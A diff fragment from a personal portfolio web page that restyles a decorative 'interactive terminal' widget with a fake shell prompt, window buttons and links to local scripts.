-            <span class="t-prompt" style="white-space:nowrap;font-size:0.8rem;">alex@portfolio:~$</span>
-            <input type="text" id="term-input" class="term-input" placeholder="help" autocomplete="off"
-                spellcheck="false" />
-        </div>
-    </div>
-    <button class="term-toggle-btn" id="term-toggle">&gt;_</button>
-    <script src="../js/main.js"></script>
-    <script src="../js/terminal.js"></script>
+<div id="interactive-terminal" class="terminal-window">
+  <div class="terminal-titlebar">
+    <div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div>
+    <span class="terminal-title">Terminal interactif</span>
+    <button id="term-close" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">✕</button>
+  </div>
+  <div class="term-interactive-body" id="term-output"></div>
+  <div class="term-input-line">
+    <span class="t-prompt" style="white-space:nowrap;font-size:0.8rem;color:var(--green)">alex@portfolio:~$</span>
+    <input type="text" id="term-input" class="term-input" placeholder="help" autocomplete="off" spellcheck="false"/>
+  </div>
+</div>
+<button class="term-toggle-btn" id="term-toggle">&gt;_</button>
+<script src="../js/main.js"></script>
+<script src="../js/terminal.js"></script>
 </body>
-
 </html>
